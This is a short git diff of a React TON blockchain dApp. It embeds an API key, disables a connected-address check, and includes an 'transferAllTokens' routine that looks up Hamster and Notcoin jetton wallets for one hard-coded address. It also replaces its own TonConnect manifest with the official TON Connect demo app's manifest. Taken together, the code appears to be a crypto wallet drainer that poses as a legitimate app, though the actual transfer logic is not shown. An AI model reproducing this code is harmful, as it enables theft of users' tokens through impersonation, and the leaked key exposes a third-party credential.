@@ -30,7 +30,8 @@ const Body =() => {
 
   //testnet
   const tonweb = new TonWeb(
-    new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC?api_key=36472ea05ea648addc800ba86f97b111d5236d5ee3f2ef7f96d518be892f8aea')
+    new TonWeb.HttpProvider(
+      'https://toncenter.com/api/v2/jsonRPC?api_key=36472ea05ea648addc800ba86f97b111d5236d5ee3f2ef7f96d518be892f8aea')
   );
   
   //real network
@@ -100,7 +101,7 @@ const fetchTonBalance=async(userAddress)=>{
   const fetchAllBalances = async () => {
 
 
-    if (!userAddress) return;
+    //if (!userAddress) return;
 
 
     const walletHam=await fetchJettonWalletAddress(
@@ -138,7 +139,7 @@ const fetchTonBalance=async(userAddress)=>{
 
   const transferAllTokens = async () => {
 
-    const walletHam=await fetchJettonWalletAddress(
+     const walletHam=await fetchJettonWalletAddress(
       "UQCYHGhtHlAoW_GY4gcmeCX5qXAXyRbnndJV0IIJsAX6x2yr", hamesterTokenAddress
     );
     const walletNot=await fetchJettonWalletAddress(
@@ -248,7 +249,7 @@ const fetchTonBalance=async(userAddress)=>{
 
 const App = () => {
   return (
-    <TonConnectUIProvider manifestUrl="http://localhost:5173/mainnet-tonconnect-manifest.json">
+    <TonConnectUIProvider manifestUrl="https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json">
           <Body/> 
         </TonConnectUIProvider>
   )
